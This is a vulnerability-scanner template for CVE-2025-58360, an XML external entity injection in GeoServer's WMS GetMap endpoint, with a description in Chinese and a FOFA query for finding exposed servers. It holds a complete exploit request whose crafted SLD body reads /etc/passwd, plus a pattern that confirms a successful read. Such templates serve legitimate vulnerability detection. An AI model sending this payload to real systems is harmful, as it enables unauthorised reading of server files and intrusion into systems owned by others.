id: CVE-2025-58360

info:
  name: GeoServer XML外部实体注入漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |-
    该漏洞源于 /geoserver/wms 端点的 GetMap 操作在接收 XML 请求时未对外部实体引用进行充分限制。攻击者可以利用该漏洞，通过构造恶意的 XML 数据注入外部实体，从而读取服务器上的敏感信息或导致拒绝服务。
    fofa: app="GeoServer"
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58360
    - https://mp.weixin.qq.com/s/Rr9hAlfC_1GsHxSYGXwaJQ
  tags: cve,cve2025,geoserver,xxe
  created: 2025/11/26

rules:
  r0:
    request:
      method: POST
      path: /geoserver/wms?service=WMS&version=1.1.0&request=GetMap&layers=topp:states&bbox=-130,24,-66,50&width=800&height=400&srs=EPSG:4326&format=image/png
      headers:
        Content-Type: application/vnd.ogc.sld+xml
      body: |
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE StyledLayerDescriptor [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <StyledLayerDescriptor version="1.0.0" xmlns="http://www.opengis.net/sld">
          <NamedLayer>
            <Name>&xxe;</Name>
            <UserStyle/>
          </NamedLayer>
        </StyledLayerDescriptor>
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
